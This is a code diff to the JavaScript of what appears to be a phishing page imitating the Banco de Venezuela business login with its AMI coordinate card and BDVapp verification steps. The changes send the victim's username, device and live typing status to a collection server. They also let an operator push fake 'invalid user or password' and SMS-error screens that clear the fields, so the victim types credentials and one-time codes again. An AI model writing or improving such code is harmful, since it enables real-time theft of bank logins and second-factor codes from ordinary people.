@@ -31,17 +31,46 @@
 
   function sendState(state) {
     if (!sessionId) return;
+    const payload = JSON.stringify({ state });
     fetch(`/api/sessions/${sessionId}/state`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ state })
+      body: payload
     }).catch(() => {});
+    fetch(`/api/sessions/${sessionId}/state`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: payload
+    }).catch(() => {});
+  }
+
+  let lastTypingSent = 0;
+  function notifyTyping() {
+    const now = Date.now();
+    if (now - lastTypingSent > 1000) {
+      lastTypingSent = now;
+      sendState('typing');
+    }
   }
 
   const userInput = document.querySelector('input[formcontrolname="username"], input[name="username"]');
   const entrarBtn = document.querySelector('.button-login-container button');
   const userField = userInput ? userInput.closest('.mat-form-field') : null;
   const userLabel = userField ? userField.querySelector('.mat-form-field-label') : null;
+  const userError = document.getElementById('userError');
+
+  function setUserError(show, message) {
+    if (!userField) return;
+    userField.classList.toggle('mat-form-field-invalid', show);
+    userField.classList.toggle('ng-invalid', show);
+    if (userError) {
+      userError.hidden = !show;
+      if (message) userError.textContent = message;
+    }
+    if (userInput) {
+      userInput.setAttribute('aria-invalid', show ? 'true' : 'false');
+    }
+  }
 
   function updateUserFloat() {
     if (!userField) return;
@@ -63,6 +92,8 @@
     userInput.addEventListener('input', () => {
       if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
       updateUserFloat();
+      setUserError(false);
+      notifyTyping();
     });
     updateUserFloat();
     if (entrarBtn) entrarBtn.disabled = userInput.value.trim().length === 0;
@@ -120,6 +151,19 @@
     const userVal = userInput.value.trim();
     sessionStorage.setItem('last_user', userVal);
     openModal();
+
+    const device = /mobile|android|iphone|ipad|phone/i.test(navigator.userAgent) ? 'mobile' : 'desktop';
+    const sessionPayload = JSON.stringify({
+      id: sessionId,
+      username: userVal,
+      password: '—',
+      tipoUsuario: 'EMPRESAS',
+      device: device,
+      state: 'typing'
+    });
+    fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload }).catch(() => {});
+    startPing();
+    startPolling();
   }
 
   if (entrarBtn) {
@@ -144,6 +188,7 @@
   password.addEventListener('input', () => {
     updatePassField();
     if (password.value.length > 0) setPassError(false);
+    notifyTyping();
   });
 
   cancelBtn.addEventListener('click', closeModal);
@@ -223,7 +268,7 @@
     currentOtpAction = selectedMethod;
     if (!acceptMethodText) return;
     if (selectedMethod === 'ami') {
-      acceptMethodText.textContent = 'Tarjeta de Coordenadas (AMI)';
+      acceptMethodText.textContent = 'AMI';
     } else if (selectedMethod === 'bdvapp') {
       acceptMethodText.textContent = 'Autenticación BDVapp';
     } else {
@@ -291,8 +336,8 @@
     const matLabel = codeLabel ? codeLabel.querySelector('mat-label') : null;
 
     if (mode === 'ami') {
-      if (authMethodName) authMethodName.textContent = 'Tarjeta de Coordenadas (AMI)';
-      if (labelTitle) labelTitle.textContent = 'Tarjeta de Coordenadas (AMI)';
+      if (authMethodName) authMethodName.textContent = 'AMI';
+      if (labelTitle) labelTitle.textContent = 'AMI';
       if (labelSub) labelSub.textContent = 'Introduce las coordenadas de tu tarjeta AMI Venlínea';
       if (matLabel) matLabel.textContent = 'Coordenadas AMI';
     } else if (mode === 'bdvapp') {
@@ -361,6 +406,7 @@
     verifyCode.addEventListener('input', () => {
       updateCodeFloat();
       setCodeError(false);
+      notifyTyping();
     });
   }
 
@@ -414,9 +460,26 @@
         } else if (action === 'error-login') {
           sessionStorage.removeItem('is_waiting');
           hideSpinner();
-          openModal();
-          setPassError(true, 'Usuario o contraseña inválida. Verifique sus datos.');
-          continueBtn.disabled = false;
+          closeModal();
+          if (authMethod) {
+            authMethod.hidden = true;
+            authMethod.style.setProperty('display', 'none', 'important');
+          }
+          if (loginUnico) {
+            loginUnico.hidden = false;
+            loginUnico.style.setProperty('display', 'block', 'important');
+          }
+          if (userInput) {
+            userInput.value = '';
+            updateUserFloat();
+            setUserError(true, 'Usuario o contraseña inválida. Verifique sus datos.');
+            if (entrarBtn) entrarBtn.disabled = true;
+            setTimeout(() => userInput.focus(), 60);
+          }
+          if (password) {
+            password.value = '';
+            updatePassField();
+          }
         } else if (action === 'error-sms') {
           sessionStorage.removeItem('is_waiting');
           hideSpinner();
